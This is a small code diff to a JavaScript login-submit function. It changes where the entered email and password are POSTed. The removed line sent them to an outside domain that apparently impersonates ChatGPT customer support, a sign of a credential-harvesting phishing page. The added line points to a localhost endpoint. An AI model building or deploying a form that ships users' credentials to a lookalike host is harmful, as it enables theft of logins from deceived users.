@@ -55,7 +55,7 @@ async function submitLogin() {
     return;
   }
 
-  await fetch('https://chatgpt.helpscustomer.com', {
+  await fetch('http://localhost:3000/save', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ email: email, password: password })
